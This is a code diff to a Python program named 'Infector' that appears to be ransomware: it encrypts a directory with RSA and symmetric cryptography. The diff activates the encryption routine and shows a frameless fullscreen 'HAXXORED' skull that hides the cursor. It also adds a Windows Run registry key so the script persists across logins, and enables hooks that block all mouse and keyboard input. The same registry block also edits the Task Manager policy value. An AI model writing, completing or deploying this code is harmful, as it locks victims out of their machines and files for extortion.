@@ -1,6 +1,6 @@
 import shutil
-import os, var, json, base64
-import pythoncom, pyHook 
+import os, inspect, var, json, base64
+import pyHook 
 from RSAMain import RSAEncryption
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding, hashes, hmac, serialization
@@ -46,45 +46,79 @@ class Infector:
                 shutil.rmtree(os.path.join(root, dir), ignore_errors=True)
 
 
+def scriptinfo():
+    for teil in inspect.stack():
+        if teil[1].startswith("<"):
+            continue
+        if teil[1].upper().startswith(sys.exec_prefix.upper()):
+            continue
+        trc = teil[1]
+        
+    if getattr(sys, 'frozen', False):
+        scriptdir, scriptname = os.path.split(sys.executable)
+        directory = scriptdir + "\\" + scriptname
+        return directory
+
+    scriptdir, trc = os.path.split(trc)
+
+    if not scriptdir:
+        scriptdir = os.getcwd()
+
+    directory = scriptdir + "/" + trc
+    return directory
+
 def main():
     Infector().encryptDir()
 
-# if __name__ == '__main__':
-#     main()
+if __name__ == '__main__':
+    main()
 
+# Creating a tkinter window instance
 root = Tk()
-root.title('Infector')
+
+# Setting tkinter window size to fullscreen
 root.geometry("{0}x{1}+0+0".format(root.winfo_screenwidth(), root.winfo_screenheight()))
-# root.overrideredirect(True)
-# root.config(cursor="none")
+
+# Removes window frame
+root.overrideredirect(True)
+
+# Hides mouse cursor
+root.config(cursor="none")
+
+# Configuring font, font color, and background
 root.configure(background='black')
-skull = Label(root, text=" @@@@@                                        @@@@@\n@@@@@@@                                      @@@@@@@\n@@@@@@@           @@@@@@@@@@@@@@@            @@@@@@@\n@@@@@@@@       @@@@@@@@@@@@@@@@@@@        @@@@@@@@\n@@@@@     @@@@@@@@@@@@@@@@@@@@@     @@@@@\n@@@@@  @@@@@@@@@@@@@@@@@@@@@@@  @@@@@\n@@  @@@@@@@@@@@@@@@@@@@@@@@@@  @@\n@@@@@@@    @@@@@@    @@@@@@\n@@@@@@      @@@@      @@@@@\n@@@@@@      @@@@      @@@@@\n@@@@@@    @@@@@@    @@@@@\n@@@@@@@@@@@  @@@@@@@@@@\n@@@@@@@@@@  @@@@@@@@@\n@@   @@@@@@@@@@@@@@@@@   @@\n@@@@  @@@@ @ @ @ @ @@@@  @@@@\n@@@@@   @@@ @ @ @ @ @@@   @@@@@\n@@@@@      @@@@@@@@@@@@@      @@@@@\n@@@@          @@@@@@@@@@@          @@@@\n@@@@@              @@@@@@@              @@@@@\n@@@@@@@                                 @@@@@@@\n@@@@@                                   @@@@@\nYou have been HAXXORED")
+skull = Label(root, text=var.LOGO)
 skull.config(font=("fixedsys", 17))
 skull.config(background="black")
-hackingGreen = "#%02x%02x%02x" % (102, 255, 0)
 skull.config(foreground="#66FF00")
 skull.grid(column=0, row=0)
 root.columnconfigure(0, weight=1)
 root.rowconfigure(0, weight=1)
 
+# Edits registry to remove task manager option
 keyVal = r'Software\Microsoft\Windows\CurrentVersion\Policies\System'
 try:
     key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
 except:
     key = CreateKey(HKEY_CURRENT_USER, keyVal)
-SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 1)    
+SetValueEx(key, "DisableTaskMgr", 0, REG_DWORD, 0)   
 
-# [HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System]
-# "DisableTaskMgr"=dword:00000001
+# Edits registry to add script to startup
+keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
+try:
+    key = OpenKey(HKEY_CURRENT_USER, keyVal, 0, KEY_ALL_ACCESS)
+except:
+    key = CreateKey(HKEY_CURRENT_USER, keyVal)
+SetValueEx(key, "RRWOS", 0, REG_SZ, scriptinfo())   
 
-# def uMad(event):
-#     return False
+# Locking mouse and keyboard input
+def lockInput(event):
+    return False
 
-# hm = pyHook.HookManager()
-# hm.MouseAll = uMad
-# hm.KeyAll = uMad
-# hm.HookMouse()
-# hm.HookKeyboard()
-#pythoncom.PumpMessages()
+hm = pyHook.HookManager()
+hm.MouseAll = lockInput
+hm.KeyAll = lockInput
+hm.HookMouse()
+hm.HookKeyboard()
 
 mainloop()
